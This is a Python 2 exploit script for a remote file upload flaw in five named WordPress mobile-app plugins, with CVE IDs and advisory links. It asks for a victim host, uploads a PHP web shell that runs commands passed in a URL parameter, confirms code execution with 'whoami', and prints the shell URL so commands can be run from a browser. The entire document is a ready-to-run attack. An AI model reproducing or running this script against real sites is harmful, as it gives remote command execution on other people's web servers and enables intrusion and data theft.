import requests
import random
import string
print "---------------------------------------------------------------------"
print "Multiple  Wordpress Plugin - Remote File Upload Exploit\nDiscovery: Larry W. Cashdollar\nExploit Author: Munir Njiru\nCWE: 434\n\n1. Zen App Mobile Native <=3.0 (CVE-2017-6104)\n2. Wordpress Plugin webapp-builder v2.0 (CVE-2017-1002002)\n3. Wordpress Plugin wp2android-turn-wp-site-into-android-app v1.1.4 CVE-2017-1002003)\n4.Wordpress Plugin mobile-app-builder-by-wappress v1.05 CVE-2017-1002001)\n5. Wordpress Plugin mobile-friendly-app-builder-by-easytouch v3.0 (CVE-2017-1002000)\n\nReference URLs:\nhttp://www.vapidlabs.com/advisory.php?v=178\nhttp://www.vapidlabs.com/advisory.php?v=179\nhttp://www.vapidlabs.com/advisory.php?v=180\nhttp://www.vapidlabs.com/advisory.php?v=181\nhttp://www.vapidlabs.com/advisory.php?v=182"
print "---------------------------------------------------------------------"
victim = raw_input("Please Enter victim host e.g. http://example.com: ")
plug_choice=raw_input ("\n Please choose a number representing the plugin to attack: \n1. Zen App Mobile Native <=3.0\n2. Wordpress Plugin webapp-builder v2.0\n3. Wordpress Plugin wp2android-turn-wp-site-into-android-app v1.1.4\n4.Wordpress Plugin mobile-app-builder-by-wappress v1.05\n5. Wordpress Plugin mobile-friendly-app-builder-by-easytouch v3.0\n")
if plug_choice=="1":
	plugin="zen-mobile-app-native"
elif plug_choice=="2":
	plugin="webapp-builder"
elif plug_choice=="3":
	plugin="wp2android-turn-wp-site-into-android-app"
elif plug_choice=="4":
	plugin="mobile-app-builder-by-wappress"
elif plug_choice=="5":
	plugin="mobile-friendly-app-builder-by-easytouch"
else:
	print "Invalid Plugin choice, I will now exit"
	quit()	
slug = "/wp-content/plugins/"+plugin+"/server/images.php"
target=victim+slug
def definShell(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

shellName= definShell()+".php"

def checkExistence():
	litmusTest = requests.get(target)
	litmusState = litmusTest.status_code
	if litmusState == 200:
		print "\nTesting if vulnerable script is available\nI can reach the target & it seems vulnerable, I will attempt the exploit\nRunning exploit..."
		exploit()
	else:
		print "Target has a funny code & might not be vulnerable, I will now exit\n"
		quit()
	
def exploit():
	print "\nGenerating Payload: "+shellName+"\n"
	myShell = {'file': (shellName, '<?php echo system($_GET[\'alien\']); ?>')}
	shellEmUp = requests.post(target, files=myShell)
	respShell = shellEmUp.text
	cleanURL = respShell.replace("http://example.com/",victim+"/wp-content/plugins/"+plugin+"/")
	shellLoc = cleanURL.replace(" ", "")
	print "Confirming shell upload by printing current user\n"
	shellTest=requests.get(shellLoc+"?alien=whoami")
	webserverUser=shellTest.text
	if webserverUser == "":
		print "I can't run the command can you try manually on the browser: \n"+shellLoc+"?alien=whoami"
		quit()
	else:
		print "The current webserver user is: "+webserverUser+"\n"
		print "Shell Can be controlled from the browser by running :\n"+shellLoc+"?alien=command"
		quit()

if __name__ == "__main__":
	checkExistence()
